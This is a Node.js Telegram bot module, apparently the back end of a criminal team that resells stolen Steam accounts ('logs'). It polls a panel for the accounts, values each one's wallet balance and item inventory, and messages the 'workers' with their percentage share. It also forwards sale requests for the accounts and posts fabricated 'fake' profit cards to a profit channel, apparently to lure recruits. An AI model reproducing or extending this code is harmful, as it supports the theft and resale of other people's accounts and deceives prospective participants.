const { Input } = require("telegraf");
const SteamLog = require("../models/SteamLog");
const User = require("../models/User");
const { env } = require("../config/env");
const { logger } = require("../utils/logger");
const { pe, E, FALLBACK, telegramHtmlCaption } = require("../utils/emoji");
const { renderSteamProfitImage } = require("../utils/steamImageRenderer");
const { renderSteamLogImage } = require("../utils/steamLogImageRenderer");
const {
  steamLogSellKeyboard,
  steamLogSellPendingKeyboard,
} = require("../keyboards/common");
const { getUserByTelegramId, getUserByPanelUsername } = require("./userService");
const {
  authCredentials,
  isServiceUnavailable,
  isServiceUnavailableError,
  serviceUnavailableMsLeft,
  invalidatePanelToken,
} = require("./apiService");
const { sanitizeEntities } = require("./postService");
const { buildMafileChannelCaption } = require("./mafileStatusService");
const {
  getSteamAccounts,
  getSteamAccountById,
  createCheckValidTask,
  getSteamTaskById,
  getSteamInventory,
} = require("./steamApiService");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

let pollInFlight = false;
let lastCircuitLogAt = 0;
let lastPollFailLogAt = 0;
let consecutivePollFails = 0;

function calcWorkerShare(total) {
  return Number((Math.max(0, Number(total) || 0) * Math.max(1, Math.min(100, env.steamWorkerPercent)) / 100).toFixed(2));
}

function accountBalanceUsd(account) {
  const steam = account?.steamInfo || {};
  if (steam.balanceUsd != null && Number.isFinite(Number(steam.balanceUsd))) {
    return Math.max(0, Number(steam.balanceUsd));
  }
  if (steam.balance != null && Number.isFinite(Number(steam.balance))) {
    return Math.max(0, Number(steam.balance));
  }
  return 0;
}

/** Как на панели: tradable (иначе marketable / total). Не accountPrice — там копия баланса. */
function accountInventoryUsd(account) {
  return inventoryPriceUsd(account?.inventory?.price, 0);
}

function parseUsdNumber(value) {
  if (value && typeof value === "object") {
    return parseUsdNumber(value.usd ?? value.value ?? value.amount ?? value.total ?? value.price);
  }
  if (typeof value === "string") {
    const normalized = value.replace(/\s+/g, "").replace(",", ".").replace(/[^0-9.-]/g, "");
    const parsed = Number(normalized);
    return Number.isFinite(parsed) ? parsed : 0;
  }
  const parsed = Number(value);
  return Number.isFinite(parsed) ? parsed : 0;
}

/** Берём первую положительную оценку: tradable → marketable → total. Явный 0 не маскирует fallback. */
function inventoryPriceUsd(priceObj, fallback = 0) {
  const price = priceObj && typeof priceObj === "object" ? priceObj : { total: priceObj };
  // UProject отдаёт оценку в разных версиях API: flat price, usd/value или price.{...}.
  const nested = price.price && typeof price.price === "object" ? price.price : {};
  for (const key of ["tradable", "marketable", "total", "usd", "value", "amount"]) {
    const n = parseUsdNumber(price[key] ?? nested[key]);
    if (n > 0) return n;
  }
  return Math.max(0, parseUsdNumber(fallback));
}

function preferBetterInventoryPrice(basePrice, enrichPrice) {
  const base = basePrice && typeof basePrice === "object" ? basePrice : {};
  const enrich = enrichPrice && typeof enrichPrice === "object" ? enrichPrice : {};
  const pick = (key) => {
    const a = parseUsdNumber(base[key]);
    const b = parseUsdNumber(enrich[key]);
    const aOk = a > 0;
    const bOk = b > 0;
    if (aOk && bOk) return Math.max(a, b);
    if (bOk) return b;
    if (aOk) return a;
    if (enrich[key] != null) return enrich[key];
    return base[key];
  };
  return {
    ...base,
    ...enrich,
    tradable: pick("tradable"),
    marketable: pick("marketable"),
    total: pick("total"),
    locked: enrich.locked != null ? enrich.locked : base.locked,
    lockedDate: enrich.lockedDate != null ? enrich.lockedDate : base.lockedDate,
  };
}

/** Общая сумма лога = баланс + цена инвентаря. */
function calcLogTotal(account) {
  return Number((accountBalanceUsd(account) + accountInventoryUsd(account)).toFixed(2));
}

function formatLogTotalUsd(total) {
  return `${Number(total || 0).toFixed(2).replace(".", ",")}$`;
}

function pushText(parts, text) {
  parts.push(String(text ?? ""));
}

function pushCustomEmoji(parts, entities, key) {
  const fb = FALLBACK[key] || "•";
  const id = E[key];
  if (id) {
    entities.push({
      type: "custom_emoji",
      offset: parts.join("").length,
      length: fb.length,
      custom_emoji_id: String(id),
    });
  }
  parts.push(fb);
}

function pushBold(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "bold", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function pushCode(parts, entities, text) {
  const value = String(text ?? "");
  entities.push({ type: "code", offset: parts.join("").length, length: value.length });
  parts.push(value);
}

function buildValidLogCaption(account) {
  const balance = accountBalanceUsd(account);
  const inventory = accountInventoryUsd(account);
  const total = calcLogTotal(account);
  return [
    `${pe("celebrate")} <b>Поздравляем вас с новым логом!</b>`,
    "",
    `${pe("coins")} Общая сумма лога: <b>${formatLogTotalUsd(total)}</b>`,
    `└ Баланс: ${formatLogTotalUsd(balance)}`,
    `└ Инвентарь: ${formatLogTotalUsd(inventory)}`,
  ].join("\n");
}

/** Текст заявки на продажу с premium emoji через entities (надёжнее в каналах). */
function buildLogSaleChannelMessage(log, user) {
  const parts = [];
  const entities = [];
  const nick = user?.username ? `@${user.username}` : "—";
  const login = String(log.accountUsername || log.steamId || log.sourceId || "—");

  pushCustomEmoji(parts, entities, "package");
  pushText(parts, " ");
  pushBold(parts, entities, "Заявка на продажу лога");
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "profile");
  pushText(parts, " Воркер: ");
  pushText(parts, nick);
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "users");
  pushText(parts, " Telegram ID: ");
  pushCode(parts, entities, log.ownerTelegramId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "tag");
  pushText(parts, " Логин: ");
  pushCode(parts, entities, login);
  pushText(parts, "\n\n");

  pushCustomEmoji(parts, entities, "coins");
  pushText(parts, " Общая сумма: ");
  pushBold(parts, entities, formatLogTotalUsd(log.totalProfit));
  pushText(parts, "\n");
  pushText(parts, `└ Баланс: ${formatLogTotalUsd(log.balanceUsd)}\n`);
  pushText(parts, `└ Инвентарь: ${formatLogTotalUsd(log.inventoryUsd)}\n\n`);

  pushCustomEmoji(parts, entities, "file");
  pushText(parts, " ID лога: ");
  pushCode(parts, entities, log.sourceId || "—");
  pushText(parts, "\n");

  pushCustomEmoji(parts, entities, "time");
  pushText(parts, " Статус: ");
  pushBold(parts, entities, "ожидает");

  return {
    text: parts.join(""),
    entities: sanitizeEntities(entities),
  };
}

function snapshotAccountFields(account) {
  const balanceUsd = accountBalanceUsd(account);
  const inventoryUsd = accountInventoryUsd(account);
  return {
    balanceUsd,
    inventoryUsd,
    totalProfit: Number((balanceUsd + inventoryUsd).toFixed(2)),
    accountUsername: String(account?.username || account?.steamInfo?.nickname || ""),
    steamId: String(account?.steamInfo?.steamid || ""),
  };
}

async function submitLogSaleRequest(bot, log) {
  if (!env.steamLogSaleChannelId) {
    throw new Error("Не задан STEAM_LOG_SALE_CHANNEL_ID.");
  }
  if (log.saleStatus === "pending" || log.saleStatus === "done") {
    throw new Error("Заявка по этому логу уже отправлена.");
  }
  const user = log.ownerTelegramId ? await getUserByTelegramId(log.ownerTelegramId) : null;
  const { text, entities } = buildLogSaleChannelMessage(log, user);
  const sent = await bot.telegram.sendMessage(env.steamLogSaleChannelId, text, {
    entities,
  });
  log.saleStatus = "pending";
  log.saleChannelChatId = String(sent.chat.id);
  log.saleChannelMessageId = String(sent.message_id);
  await log.save();
  return sent;
}

async function pinDmMessage(bot, telegramId, messageId) {
  if (!telegramId || !messageId) return;
  try {
    await bot.telegram.pinChatMessage(telegramId, Number(messageId), {
      disable_notification: true,
    });
  } catch (error) {
    logger.warn("Steam DM pin failed", telegramId, error?.response?.description || error.message);
  }
}

function topItems(inventory) {
  const payload = unwrapInventory(inventory);
  const groups = Array.isArray(payload?.inventories) ? payload.inventories : [];
  const flat = groups.flatMap((group) => Array.isArray(group?.items) ? group.items : []);
  const direct = Array.isArray(payload?.items) ? payload.items : [];
  return [...flat, ...direct]
    .map((item) => ({
      icon:
        item.icon ||
        item.icon_url ||
        item.iconUrl ||
        item.image ||
        item.imageUrl ||
        item.asset_description?.icon_url ||
        item.assetDescription?.icon_url ||
        item.description?.icon_url ||
        "",
      itemHashName:
        item.itemHashName ||
        item.market_hash_name ||
        item.hash_name ||
        item.asset_description?.market_hash_name ||
        item.assetDescription?.market_hash_name ||
        item.description?.market_hash_name ||
        item.name ||
        "Unknown item",
      price: inventoryPriceUsd(item?.price, item?.priceUsd ?? item?.price_usd ?? item?.value ?? 0),
    }))
    .filter((item) => item.price > 0)
    .sort((a, b) => b.price - a.price)
    .slice(0, 7);
}

function unwrapPayload(payload, keys) {
  let value = payload;
  for (let i = 0; i < 4 && value && typeof value === "object"; i += 1) {
    const nextKey = keys.find((key) => value[key] && typeof value[key] === "object");
    if (!nextKey) break;
    value = value[nextKey];
  }
  return value || {};
}

function unwrapInventory(payload) {
  return unwrapPayload(payload, ["data", "result", "inventory"]);
}

function unwrapAccount(payload) {
  return unwrapPayload(payload, ["data", "result", "account", "row"]);
}

/** Классификация статуса лога как в панели: Валид / MaFile / прочее. */
function classifyAccountLog(row) {
  if (row?.isMaFile === true || /mafile/i.test(String(row?.status || ""))) return "mafile";
  const status = String(row?.status || "");
  if (/^(ok|valid|валид)$/i.test(status) && !row?.invalidDate) return "valid";
  if (/невалид|invalid/i.test(status)) return "invalid";
  return "other";
}

async function resolveOwnerTelegramId(row, fallbackTelegramId = "") {
  // Сначала владелец из лога (фильтр воркеров / owner), иначе кто опросил API.
  const telegram = row?.owner?.telegram;
  if (telegram) return String(telegram);
  const panelLogin = row?.owner?.username;
  if (panelLogin) {
    const user = await getUserByPanelUsername(panelLogin);
    if (user?.telegramId) return String(user.telegramId);
  }
  if (fallbackTelegramId) return String(fallbackTelegramId);
  return "";
}

async function waitTaskDone(taskId) {
  const started = Date.now();
  let result;
  while (Date.now() - started < Math.max(10000, env.steamTaskMaxWaitMs)) {
    result = await getSteamTaskById(taskId);
    if (["Done", "Failed", "Error"].includes(result?.state)) break;
    await sleep(Math.max(1000, env.steamTaskPollIntervalMs));
  }
  return result;
}

async function sendDmPhoto(bot, telegramId, imageBuffer, caption, filename, extra = {}) {
  if (!telegramId) return null;
  try {
    return await bot.telegram.sendPhoto(
      telegramId,
      Input.fromBuffer(imageBuffer, filename),
      { ...telegramHtmlCaption(caption), ...extra }
    );
  } catch (error) {
    logger.warn("Steam DM failed", telegramId, error?.response?.description || error.message);
    return null;
  }
}

async function postProfitChannel(bot, { imageBuffer, total, balanceUsd = 0, inventoryUsd = null, ownerTelegramId, status = "pending", withdrawnAmount = 0 }) {
  if (!env.steamProfitChannelId) throw new Error("Не задан STEAM_PROFIT_CHANNEL_ID.");
  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
  const caption = buildMafileChannelCaption({
    ownerTelegramId,
    user,
    total,
    balanceUsd,
    inventoryUsd,
    status,
    withdrawnAmount,
  });
  return bot.telegram.sendPhoto(
    env.steamProfitChannelId,
    Input.fromBuffer(imageBuffer, `steam-profit-${Date.now()}.png`),
    telegramHtmlCaption(caption)
  );
}

async function postAdminLogsChannel(bot, { imageBuffer, filename, caption }) {
  if (!env.steamAdminLogsChannelId) return null;
  try {
    return await bot.telegram.sendPhoto(
      env.steamAdminLogsChannelId,
      Input.fromBuffer(imageBuffer, filename),
      telegramHtmlCaption(caption)
    );
  } catch (error) {
    logger.warn("Admin logs channel post failed", error?.response?.description || error.message);
    return null;
  }
}

async function buildAdminChannelOwnerLabel(ownerTelegramId) {
  const user = ownerTelegramId ? await getUserByTelegramId(ownerTelegramId) : null;
  if (!user) return ownerTelegramId ? `<code>${ownerTelegramId}</code>` : "—";
  if (user.isAnonymous) return `<code>${user.telegramId}</code>`;
  return user.username ? `@${user.username}` : `<code>${user.telegramId}</code>`;
}

async function processValidLog(bot, log, account) {
  const imageBuffer = await renderSteamLogImage(account);
  const snap = snapshotAccountFields(account);
  const dm = await sendDmPhoto(
    bot,
    log.ownerTelegramId,
    imageBuffer,
    buildValidLogCaption(account),
    `steam-log-${log.sourceId}.png`,
    { reply_markup: steamLogSellKeyboard(log.sourceId).reply_markup }
  );
  if (dm) await pinDmMessage(bot, log.ownerTelegramId, dm.message_id);

  const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
  const login = String(account?.username || account?.steamInfo?.nickname || log.sourceId);
  await postAdminLogsChannel(bot, {
    imageBuffer,
    filename: `steam-log-${log.sourceId}.png`,
    caption: [
      `${pe("package")} <b>Новый лог</b> · Валид`,
      `${pe("profile")} Воркер: ${ownerLabel}`,
      `${pe("tag")} Логин: <code>${login}</code>`,
      `${pe("coins")} Общая сумма: <b>${formatLogTotalUsd(snap.totalProfit)}</b>`,
      `└ Баланс: ${formatLogTotalUsd(snap.balanceUsd)}`,
      `└ Инвентарь: ${formatLogTotalUsd(snap.inventoryUsd)}`,
      `${pe("file")} ID: <code>${log.sourceId}</code>`,
    ].join("\n"),
  });

  Object.assign(log, {
    status: "processed",
    logKind: "valid",
    ...snap,
    dmMessageId: dm ? String(dm.message_id) : "",
    dmChatId: dm ? String(dm.chat?.id || log.ownerTelegramId) : "",
    errorMessage: "",
  });
}

async function processMaFileLog(bot, log, account) {
  // Список /steam/accounts часто содержит сокращённую строку без inventory.
  // Сначала раскрываем карточку аккаунта, чтобы цена из панели не терялась.
  let sourceAccount = account;
  try {
    const detailed = unwrapAccount(await getSteamAccountById(null, account.id || log.sourceId));
    if (detailed?.id != null || detailed?.steamInfo || detailed?.inventory) {
      sourceAccount = { ...account, ...detailed, steamInfo: { ...(account.steamInfo || {}), ...(detailed.steamInfo || {}) }, inventory: { ...(account.inventory || {}), ...(detailed.inventory || {}) } };
    }
  } catch (error) {
    logger.warn("MaFile account details fetch failed", log.sourceId, error.message);
  }

  const steamId = String(sourceAccount?.steamInfo?.steamid || sourceAccount?.steamInfo?.steamId || log.sourceId);
  let working = sourceAccount;
  let inventoryForItems = sourceAccount?.inventory || null;
  try {
    const task = await createCheckValidTask(sourceAccount.id || log.sourceId);
    const result = task?.id ? await waitTaskDone(task.id) : task;
    if (result?.state === "Done") {
      const sid = String(result?.steam?.steamid || result?.result?.steam?.steamid || steamId);
      const inventory = await getSteamInventory(sid);
      log.steamId = sid;
      if (inventory) {
        inventoryForItems = inventory;
        working = {
          ...sourceAccount,
          steamInfo: { ...(sourceAccount?.steamInfo || {}), steamid: sid },
          inventory: {
            ...(sourceAccount?.inventory || {}),
            ...unwrapInventory(inventory),
            price: preferBetterInventoryPrice(sourceAccount?.inventory?.price, unwrapInventory(inventory)?.price),
          },
        };
      }
    }
  } catch (error) {
    logger.warn("MaFile inventory enrich failed", log.sourceId, error.message);
  }

  // CheckValid может вернуть Failed/Queued для уже готового MaFile. Инвентарь
  // всё равно доступен по Steam ID — это и есть обязательный fallback.
  if (
    (!inventoryForItems || !topItems(inventoryForItems).length || accountInventoryUsd(working) <= 0) &&
    steamId && /^\d+$/.test(steamId)
  ) {
    try {
      const inventory = unwrapInventory(await getSteamInventory(steamId));
      if (inventory) {
        inventoryForItems = inventory;
        working = {
          ...working,
          inventory: {
            ...(working.inventory || {}),
            ...inventory,
            price: preferBetterInventoryPrice(working?.inventory?.price, inventory?.price),
          },
        };
      }
    } catch (error) {
      logger.warn("MaFile direct inventory fetch failed", log.sourceId, error.message);
    }
  }

  const snap = snapshotAccountFields(working);
  // Не даём enrich с пустым инвентарём затереть уже известную сумму с полла.
  const pollSnap = snapshotAccountFields(sourceAccount);
  if (pollSnap.totalProfit > snap.totalProfit) {
    Object.assign(snap, pollSnap);
  }
  const total = snap.totalProfit;
  const workerShare = calcWorkerShare(total);
  const items = topItems(inventoryForItems);
  const imageBuffer = await renderSteamProfitImage({
    items,
    games: sourceAccount.gamesInfo || sourceAccount.games || [],
    total,
    balanceUsd: snap.balanceUsd,
    inventoryUsd: snap.inventoryUsd,
    workerShare,
    workerPercent: Math.max(1, Math.min(100, Number(env.steamWorkerPercent) || 80)),
    mafileTime:
      sourceAccount.mafileSessionAvailableAt ||
      sourceAccount.maFileSessionAvailableAt ||
      sourceAccount.mafileTime ||
      sourceAccount.maFileTime ||
      "",
  });

  const dm = await sendDmPhoto(
    bot,
    log.ownerTelegramId,
    imageBuffer,
    `${pe("gift")} <b>Найден новый MaFile</b>\n<code>${sourceAccount.username || sourceAccount.steamInfo?.nickname || log.sourceId}</code>\n${pe("coins")} Сумма: $${total.toFixed(2)}\n└ Баланс: $${Number(snap.balanceUsd || 0).toFixed(2)} · Инвентарь: $${Number(snap.inventoryUsd || 0).toFixed(2)}`,
    `steam-mafile-${log.sourceId}.png`
  );

  let channelMessageId = String(log.channelMessageId || "");
  try {
    const sent = await postProfitChannel(bot, {
      imageBuffer,
      total,
      balanceUsd: snap.balanceUsd,
      inventoryUsd: snap.inventoryUsd,
      ownerTelegramId: log.ownerTelegramId,
    });
    channelMessageId = String(sent.message_id);
  } catch (error) {
    logger.warn("MaFile channel post failed", error.message);
  }

  const ownerLabel = await buildAdminChannelOwnerLabel(log.ownerTelegramId);
  const login = String(sourceAccount?.username || sourceAccount?.steamInfo?.nickname || log.sourceId);
  await postAdminLogsChannel(bot, {
    imageBuffer,
    filename: `steam-mafile-${log.sourceId}.png`,
    caption: [
      `${pe("gift")} <b>Новый MaFile</b>`,
      `${pe("profile")} Воркер: ${ownerLabel}`,
      `${pe("tag")} Логин: <code>${login}</code>`,
      `${pe("coins")} Сумма: <b>$${total.toFixed(2)}</b>`,
      `└ Баланс: $${Number(snap.balanceUsd || 0).toFixed(2)} · Инвентарь: $${Number(snap.inventoryUsd || 0).toFixed(2)}`,
      `└ Доля воркера: $${workerShare.toFixed(2)} (${env.steamWorkerPercent}%)`,
      `${pe("file")} ID: <code>${log.sourceId}</code>`,
    ].join("\n"),
  });

  Object.assign(log, {
    status: "processed",
    logKind: "mafile",
    steamId: log.steamId || steamId,
    ...snap,
    dmMessageId: dm ? String(dm.message_id) : log.dmMessageId || "",
    channelMessageId,
    errorMessage: "",
  });
}

async function processAccountLog(bot, log, account) {
  try {
    const kind = classifyAccountLog(account);
    if (kind === "valid") {
      await processValidLog(bot, log, account);
    } else if (kind === "mafile") {
      await processMaFileLog(bot, log, account);
    } else {
      Object.assign(log, {
        status: "processed",
        logKind: kind,
        ...snapshotAccountFields(account),
        errorMessage: "",
      });
    }
  } catch (error) {
    Object.assign(log, {
      status: "failed",
      errorMessage: error?.response?.data?.message || error.message,
    });
    logger.error("Steam account log process failed", log.sourceId, log.errorMessage);
  }
  await log.save();
}

async function ingestAccountRows(bot, rows, fallbackTelegramId = "") {
  for (const account of rows) {
    const sourceId = String(account?.id || "");
    if (!/^\d+$/.test(sourceId)) continue;

    const kind = classifyAccountLog(account);
    // Только Валид и MaFile — Невалид и прочее не шлём в ЛС.
    if (kind !== "valid" && kind !== "mafile") continue;

    const existing = await SteamLog.findOne({ sourceId });
    if (existing) {
      // Тот же лог позже получил MaFile — отдельное уведомление.
      if (
        existing.logKind === "valid" &&
        kind === "mafile" &&
        existing.status === "processed"
      ) {
        existing.logKind = "mafile";
        existing.status = "new";
        existing.errorMessage = "";
        existing.ownerTelegramId =
          (await resolveOwnerTelegramId(account, fallbackTelegramId)) || existing.ownerTelegramId;
        await processMaFileLog(bot, existing, account);
        await existing.save();
      }
      continue;
    }

    const ownerTelegramId = await resolveOwnerTelegramId(account, fallbackTelegramId);
    const log = await SteamLog.create({
      sourceId,
      ownerTelegramId,
      status: "new",
      logKind: kind,
    });
    await processAccountLog(bot, log, account);
  }
}

function logPollFail(username, error, { force = false } = {}) {
  const now = Date.now();
  consecutivePollFails += 1;
  if (!force && consecutivePollFails > 3 && now - lastPollFailLogAt < 60000) return;
  lastPollFailLogAt = now;
  const status = error?.response?.status;
  const detail =
    status != null
      ? `Request failed with status code ${status}`
      : error?.response?.data?.message || error.message;
  logger.warn("Steam accounts poll failed", username || "team", detail);
}

async function pollPanelUser(bot, user) {
  if (!user?.panelUsername || !user?.panelPassword) return false;
  if (isServiceUnavailable()) return false;
  try {
    const auth = await authCredentials(user.panelUsername, user.panelPassword);
    if (!auth?.token) return false;
    const payload = await getSteamAccounts(auth.token, { offset: 0, limit: 50 });
    await ingestAccountRows(bot, payload?.rows || [], user.telegramId);
    consecutivePollFails = 0;
    return true;
  } catch (error) {
    if (error?.response?.status === 401) {
      invalidatePanelToken(user.panelUsername);
    }
    logPollFail(user.panelUsername, error);
    return false;
  }
}

/**
 * One team-key request covers all worker accounts.
 * Per-worker login polls only if the key call fails with auth/permission errors.
 */
async function pollOnce(bot) {
  if (pollInFlight) return;
  if (isServiceUnavailable()) {
    const now = Date.now();
    if (now - lastCircuitLogAt > 60000) {
      lastCircuitLogAt = now;
      logger.warn(
        "Steam poll paused — uproject unavailable",
        `${Math.ceil(serviceUnavailableMsLeft() / 1000)}s left`
      );
    }
    return;
  }

  pollInFlight = true;
  try {
    try {
      const payload = await getSteamAccounts(null, { offset: 0, limit: 100 });
      await ingestAccountRows(bot, payload?.rows || []);
      consecutivePollFails = 0;
      return;
    } catch (error) {
      if (isServiceUnavailableError(error) || isServiceUnavailable()) {
        logPollFail("team", error, { force: true });
        return;
      }
      logPollFail("team", error, { force: true });
    }

    const users = await User.find({
      isTeamMember: true,
      isBanned: { $ne: true },
      panelUsername: { $exists: true, $ne: "" },
      panelPassword: { $exists: true, $ne: "" },
    }).limit(100);

    const delay = Math.max(100, Number(env.steamPollUserDelayMs) || 400);
    for (const user of users) {
      if (isServiceUnavailable()) break;
      await pollPanelUser(bot, user);
      await sleep(delay);
    }
  } catch (error) {
    logger.error("Steam poll failed", error?.response?.data || error.message);
  } finally {
    pollInFlight = false;
  }
}

async function recheckSteamId(bot, sourceId) {
  if (!/^\d+$/.test(String(sourceId || ""))) throw new Error("ID лога должен содержать только цифры.");
  const payload = await getSteamAccounts(null, { offset: 0, limit: 100 });
  const account = (payload?.rows || []).find((row) => String(row.id) === String(sourceId));
  if (!account) throw new Error("Лог не найден в /steam/accounts.");
  const ownerTelegramId = await resolveOwnerTelegramId(account);
  const log = await SteamLog.findOneAndUpdate(
    { sourceId: String(sourceId) },
    { status: "new", errorMessage: "", ownerTelegramId, logKind: classifyAccountLog(account) },
    { new: true, upsert: true, setDefaultsOnInsert: true }
  );
  await processAccountLog(bot, log, account);
  return log;
}

async function sendFakeSteamProfit(bot, {
  items,
  total,
  balanceUsd = 0,
  inventoryUsd = null,
  games = [],
  mafileTime = "",
  anonymous,
  ownerTelegramId,
}) {
  const inventory = inventoryUsd == null
    ? Number(items.reduce((sum, item) => sum + (Number(item?.price) || 0), 0).toFixed(2))
    : Math.max(0, Number(inventoryUsd) || 0);
  const balance = Math.max(0, Number(balanceUsd) || 0);
  const grandTotal = Number(total) || Number((balance + inventory).toFixed(2));
  const workerShare = calcWorkerShare(grandTotal);
  const workerPercent = Math.max(1, Math.min(100, Number(env.steamWorkerPercent) || 80));

  const imageBuffer = await renderSteamProfitImage({
    items,
    games,
    total: grandTotal,
    balanceUsd: balance,
    inventoryUsd: inventory,
    mafileTime,
    workerShare,
    workerPercent,
  });

  const channelMsg = await postProfitChannel(bot, {
    imageBuffer,
    total: grandTotal,
    balanceUsd: balance,
    inventoryUsd: inventory,
    ownerTelegramId: anonymous ? null : ownerTelegramId,
  });

  const ownerLabel = anonymous
    ? "Аноним"
    : await buildAdminChannelOwnerLabel(ownerTelegramId);
  await postAdminLogsChannel(bot, {
    imageBuffer,
    filename: `steam-mafile-fake-${Date.now()}.png`,
    caption: [
      `${pe("gift")} <b>Фейк MaFile</b>`,
      `${pe("profile")} Воркер: ${ownerLabel}`,
      `${pe("coins")} Сумма: <b>$${grandTotal.toFixed(2)}</b>`,
      `└ Баланс: $${balance.toFixed(2)} · Инвентарь: $${inventory.toFixed(2)}`,
      `└ Доля воркера: $${workerShare.toFixed(2)} (${workerPercent}%)`,
    ].join("\n"),
  });

  return channelMsg;
}

/** Фейк / тест карточки валид-лога в ЛС участника. */
async function sendFakeSteamLog(bot, { account, ownerTelegramId }) {
  if (!ownerTelegramId) throw new Error("Не указан получатель фейк-лога.");
  const sourceId = `fake-${Date.now()}`;
  const snap = snapshotAccountFields(account);
  const log = await SteamLog.create({
    sourceId,
    ownerTelegramId: String(ownerTelegramId),
    status: "processed",
    logKind: "valid",
    saleStatus: "none",
    ...snap,
  });
  const imageBuffer = await renderSteamLogImage(account);
  const dm = await sendDmPhoto(
    bot,
    ownerTelegramId,
    imageBuffer,
    buildValidLogCaption(account),
    `steam-log-fake-${Date.now()}.png`,
    { reply_markup: steamLogSellKeyboard(sourceId).reply_markup }
  );
  if (!dm) throw new Error("Не удалось отправить лог в ЛС (бот заблокирован или неверный ID).");
  await pinDmMessage(bot, ownerTelegramId, dm.message_id);
  log.dmMessageId = String(dm.message_id);
  log.dmChatId = String(dm.chat?.id || ownerTelegramId);
  await log.save();
  return dm;
}

function startSteamMonitor(bot) {
  pollOnce(bot);
  // Min 30s — shorter intervals hammer uproject when it is already 503.
  setInterval(() => pollOnce(bot), Math.max(30000, env.steamPollIntervalMs));
  logger.info("Steam monitor started");
}

module.exports = {
  startSteamMonitor,
  recheckSteamId,
  sendFakeSteamProfit,
  sendFakeSteamLog,
  submitLogSaleRequest,
  classifyAccountLog,
};
